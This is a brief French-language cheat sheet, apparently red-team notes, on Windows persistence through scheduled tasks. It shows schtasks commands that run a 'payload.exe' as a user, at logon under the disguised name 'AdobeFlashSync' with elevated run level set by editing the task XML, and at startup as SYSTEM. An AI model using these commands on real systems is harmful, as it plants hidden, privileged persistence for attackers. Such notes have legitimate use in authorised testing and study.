# Scheduled Task

Elle consiste a effectuer des taches planifier en tant que un utilisateur particulier


- En tant que `Utilisateur`

```sh
schtasks /create /tn "Mytasks\go" /sc daily /st 09:00 /tr "c:\pers\payload.exe"
```

```sh
# Information sur la tache
schtasks /query /tn "mytasks\go" /fo:list /v

# Demarrer la taches
schtasks /run /tn "mytasks\go"
```


- En tant que `Administrateur`

```sh
schtasks /create /sc onlogon /tn "AdobeFlashSync" /tr "c:\pers\payload.exe"
```

```sh
# Information sur la tache
schtasks /query /tn "AdobeFlashSync" /fo list

# Recuperer la tache en fichier XML
schtasks /query /tn "AdobeFlashSync" /xml 
schtasks /query /tn "AdobeFlashSync" /xml > tsk.xml
```

Maintenant ajouter **`<RunLevel>HighestAvailable</RunLevel>`** dans le fichier `tsk.xml` juste en bas de `<LogonType>InteractiveToken</LogonType>`

```sh
schtasks /delete /f /tn "AdobeFlashSync"
schtasks /create /tn "AdobeFlashSync" /xml tsk.xml
```

- En tant que `AUTORITER NT\SYSTEM`

```sh
schtasks /create /RU SYSTEM /SC onstart /TN "PERSIST" /TR "c:\pers\payload.exe"
```

